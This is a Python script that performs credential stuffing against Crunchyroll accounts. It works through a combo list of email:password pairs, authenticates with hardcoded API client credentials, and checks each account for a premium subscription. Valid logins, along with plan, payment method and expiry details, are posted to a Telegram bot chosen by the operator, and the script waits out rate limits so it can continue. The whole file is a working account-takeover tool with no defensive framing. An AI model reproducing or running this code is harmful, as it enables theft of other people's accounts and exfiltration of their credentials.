import requests,random,time
from user_agent import *
from uuid import *
from rich.panel import Panel
from cfonts import render, say
EHRA = render('{ANIME}', colors=['white', 'cyan'], align='center')
print (EHRA)
print ('◧'*60)
G = '\033[2;37m'
R = '\033[1;31m'
O = '\x1b[38;5;208m'


def login(email,pasw):
	headers = {"ETP-Anonymous-ID": str(uuid1),"Request-Type": "SignIn","Accept": "application/json","Accept-Charset": "UTF-8","User-Agent": "Ktor client","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Host": "beta-api.crunchyroll.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
	data = {"grant_type":"password","username":email,"password":pasw,"scope":"offline_access","client_id":"yhukoj8on9w2pcpgjkn_","client_secret":"q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF","device_type":"FIRETV","device_id":str(uuid1),"device_name":"kara"}
	res = requests.post("https://beta-api.crunchyroll.com/auth/v1/token",data=data,headers=headers)
	token = res.text.split('access_token":"')[1].split('"')[0]

	if "refresh_token" in res.text:
		headers_get = {"Authorization": f"Bearer {token}","Accept": "application/json","Accept-Charset": "UTF-8","User-Agent": "Ktor client","Content-Length":"0","Host": "beta-api.crunchyroll.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
		res_get = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me",headers=headers_get)
		if "external_id" in res_get.text:
			external_id = res_get.text.split('external_id":"')[1].split('"')[0]
			headers_info = {"Authorization": f"Bearer {token}","Accept": "application/json","Accept-Charset": "UTF-8","User-Agent": "Ktor client","Content-Length":"0","Host": "beta-api.crunchyroll.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
			res_info = requests.get(f"https://beta-api.crunchyroll.com//subs/v1/subscriptions/{external_id}/third_party_products",headers=headers_info)
			if "fan" in res_info.text or "premium" in res_info.text or "no_ads" in res_info.text or 'is_subscribable":false' in res_info.text:
				try:
					type = res_info.text.split('"type":"')[1].split('"')[0]
					free_t = res_info.text.split('"active_free_trial":')[1].split(",")[0]		
					payment = res_info.text.split('"source":"')[1].split('"')[0]
					expiry = res_info.text.split('"expiration_date":"')[1].split('T')[0]
					msg = f"""
🎉 𝙃𝙄𝙏 𝙁𝙊𝙐𝙉𝘿!						
◧◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◨
- 𝙀𝙢𝙖𝙞𝙡 ➼ `{email}`
- 𝙋𝙖𝙨𝙨𝙬𝙤𝙧𝙙 ➼ `{pasw}`
- 𝙋𝙡𝙖𝙣➼ {type}
- 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙈𝙚𝙩𝙝𝙤𝙙➼ {payment}
- 𝙏𝙧𝙞𝙖𝙡 𝙎𝙩𝙖𝙩𝙪𝙨➼ {free_t}
- 𝙀𝙓𝙋𝙄𝙍𝙔➼  {expiry}
◧◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◨
@MYEHRA
 """
					print()
					print(f' {G}{msg}')
					requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={msg}')
				except:
					print(f" {G}{msg} ⥤ [HIT] ")
					requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={email}:{pasw}')
			else:
				print()
				print(f'{O}{email}:{pasw} ⥤ [NO PREMIUM] ')
		else:
			print()
			print(f' {R}{email}:{pasw} ⥤ [BAD] ')
	elif '406 Not Acceptable' in res.text:
		print(f" — Wait a 5+ min ")
		time.sleep(420)
	else:
		print()
		print(f' {R}{email}:{pasw} ⥤ [BAD] ')
		
tok = input(f" {O}𝗘𝗡𝗧𝗘𝗥 𝗧𝗢𝗞𝗘𝗡 :-:-:  ")
print()
ID = input(f"𝗘𝗡𝗧𝗘𝗥 𝗜𝗗 :-:-: ")
print()
file_name = input(f"𝗖𝗢𝗠𝗕𝗢 𝗡𝗔𝗠𝗘 :-:-: ")
file = open(file_name).read().splitlines()
print(f"━"*60)

for line in file:
	try:
		email,pasw = line.strip().split(':')
		login(email,pasw)
	except:
		continue